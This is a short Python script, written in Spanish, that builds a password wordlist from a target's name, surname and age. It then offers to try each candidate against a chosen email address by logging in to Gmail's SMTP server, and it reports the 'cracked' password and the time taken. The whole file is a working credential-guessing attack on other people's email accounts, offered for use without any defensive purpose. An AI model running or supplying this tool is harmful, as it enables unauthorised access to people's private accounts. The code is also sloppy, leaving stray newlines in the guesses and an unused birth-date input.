import smtplib
from io import open
from colorama import *
import time
import subprocess

def diccionario():
    subprocess.run(['clear']);
    nombre=input(Fore.GREEN+"nombre: ");
    apellido=input("apellido: ");
    edad=input("edad: ");
    fecha=input("fecha de nacimiento: ");
    name=input("nombre del diccionario: ")
    print(Fore.YELLOW+"../formando diccionario../");
    combinacionA=(nombre+apellido+edad);
    combinacionB=(apellido+nombre+edad);
    combinacionC=(edad+nombre+apellido);
    combinacionD=(edad+apellido+nombre);
    combinacionE=(nombre+edad+apellido);
    combinacionF=(apellido+edad+nombre);
    diccionario=(combinacionA+"\n"+combinacionB+"\n"+combinacionC+"\n"+combinacionD+"\n"+combinacionE+"\n"+combinacionF);
    archivo=open(name,'w');
    archivo.write(diccionario);                                                 
    print(combinacionA,"\n",combinacionB,"\n",combinacionC,"\n",combinacionD,"\n",combinacionE,"\n",combinacionF);
    opcion=input("quieres intentar estas claves con un correo: [s/n] ");
    if(opcion == "s" or opcion=="S"):
        inicio=time.time();
        server=smtplib.SMTP('smtp.gmail.com','587');
        server.starttls();
        correo=input("correo: ");
        dic=open(name,'r');
        for pwd in dic:
            try:
                server.login(correo,pwd);
                print(Fore.BLUE+"contraseña correcta: ",pwd);
                final=time.time();
                print("la contraseña se crackeo en: ",format(final-inicio));
                break;
            except smtplib.SMTPAuthenticationError:
                print(Fore.RED+"contraseña incorrecta: ",pwd);
diccionario();
